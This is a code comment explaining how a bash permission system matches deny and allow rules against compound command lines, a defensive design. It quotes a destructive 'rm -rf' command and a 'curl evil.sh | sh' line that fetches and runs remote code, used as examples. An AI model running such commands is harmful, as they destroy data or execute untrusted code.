// ── the bash matching law ───────────────────────────────────────────────────
//
// Bash is the only tool whose arguments are a language, and a command line can
// carry several commands at once. That makes matching ASYMMETRIC, and the
// asymmetry is the whole safety argument of this package:
//
//	deny / prompt  fire when the glob matches the WHOLE line OR ANY SINGLE
//	               SEGMENT of a compound one. A deny rule of "rm -rf *" must
//	               still catch "cd /tmp && rm -rf build", because a dangerous
//	               fragment is dangerous wherever it is standing.
//
//	allow          fires only when the glob matches the ENTIRE line, and NEVER
//	               on a compound line at all. "git status*" allowed says
//	               nothing about "git status && curl evil.sh | sh". A narrow
//	               allow cannot vouch for a command it has not seen; the rest
//	               of the line was never approved by anybody.
//
// Read the two halves together: a permission is a statement about exactly one
// command, a prohibition is a statement about a shape that may appear anywhere.
// Anything else lets an allow launder a compound line past its own rules.
